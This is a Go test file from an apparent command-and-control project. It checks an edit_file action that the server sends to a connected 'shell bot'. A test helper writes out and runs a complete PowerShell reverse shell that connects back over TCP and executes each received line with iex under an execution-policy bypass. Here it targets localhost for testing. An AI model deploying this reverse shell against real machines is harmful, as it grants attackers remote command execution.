package shell

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"c2agent/internal/agent"
)

// spawnPSReverseShell starts a real PowerShell reverse shell that connects back
// to addr and evaluates each received line with iex, exactly like the documented
// Windows shell bot. It returns a stop function.
func spawnPSReverseShell(t *testing.T, addr string) func() {
	t.Helper()
	_, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	rs := filepath.Join(dir, "rs.ps1")
	script := fmt.Sprintf(`$c = New-Object Net.Sockets.TCPClient('127.0.0.1', %s)
$s = $c.GetStream()
[byte[]]$b = 0..65535 | ForEach-Object { 0 }
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
  $d = [Text.Encoding]::UTF8.GetString($b, 0, $i)
  $o = iex $d 2>&1 | Out-String
  $sb = [Text.Encoding]::UTF8.GetBytes($o)
  $s.Write($sb, 0, $sb.Length)
  $s.Flush()
}
$c.Close()
`, portStr)
	if err := os.WriteFile(rs, []byte(script), 0o644); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", rs)
	if err := cmd.Start(); err != nil {
		t.Fatalf("start reverse shell: %v", err)
	}
	return func() { _ = cmd.Process.Kill() }
}

// TestWindowsEditFileEndToEnd drives the full edit_file path (sentinel-wrapped
// read -> exact replace -> base64 write -> Move-Item -Force -> size verify)
// against a real PowerShell reverse shell. Skipped off Windows / in -short mode.
func TestWindowsEditFileEndToEnd(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("requires Windows PowerShell")
	}
	if testing.Short() {
		t.Skip("subprocess-heavy test skipped in -short mode")
	}

	reg := agent.NewRegistry()
	srv := NewServer(ServerOptions{
		Registry:      reg,
		Host:          "127.0.0.1",
		Port:          0,
		BotPrefix:     "BOT-",
		CmdTimeout:    30 * time.Second,
		TimeoutAction: "disconnect",
		QueueCapacity: 16,
	})
	if err := srv.Start(); err != nil {
		t.Fatalf("start: %v", err)
	}
	defer srv.Close()

	stop := spawnPSReverseShell(t, srv.Addr().String())
	defer stop()

	var ag *agent.Agent
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if ag = reg.Get("BOT-001"); ag != nil {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if ag == nil {
		t.Fatal("shell bot was not registered")
	}
	if ag.OS != "Windows" || ag.Env != EnvPowerShell {
		t.Fatalf("unexpected identity: os=%q env=%q", ag.OS, ag.Env)
	}

	f := filepath.Join(t.TempDir(), "edit_me.txt")
	if err := os.WriteFile(f, []byte("line1\nline2\nline3\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	job := agent.NewJob(agent.JobAction)
	job.Action = "edit_file"
	job.Params = map[string]any{"path": f, "old_text": "line2\n", "new_text": "LINE-TWO\n"}
	if err := ag.Enqueue(job); err != nil {
		t.Fatalf("enqueue: %v", err)
	}
	r := <-job.Result
	if r.Err != nil {
		t.Fatalf("edit error: %v", r.Err)
	}
	if !strings.HasPrefix(r.Output, "Successfully edited") {
		t.Fatalf("unexpected result: %q", r.Output)
	}
	got, err := os.ReadFile(f)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "line1\nLINE-TWO\nline3\n" {
		t.Fatalf("content = %q, want %q", got, "line1\nLINE-TWO\nline3\n")
	}

	// A second edit whose old_text is absent must fail closed and leave the file.
	bad := agent.NewJob(agent.JobAction)
	bad.Action = "edit_file"
	bad.Params = map[string]any{"path": f, "old_text": "not-present", "new_text": "x"}
	if err := ag.Enqueue(bad); err != nil {
		t.Fatalf("enqueue: %v", err)
	}
	br := <-bad.Result
	if br.Err != nil {
		t.Fatalf("edit error: %v", br.Err)
	}
	if !strings.HasPrefix(br.Output, "Error:") {
		t.Fatalf("missing old_text should fail: %q", br.Output)
	}
	if got, _ := os.ReadFile(f); string(got) != "line1\nLINE-TWO\nline3\n" {
		t.Fatalf("failed edit changed the file: %q", got)
	}
}
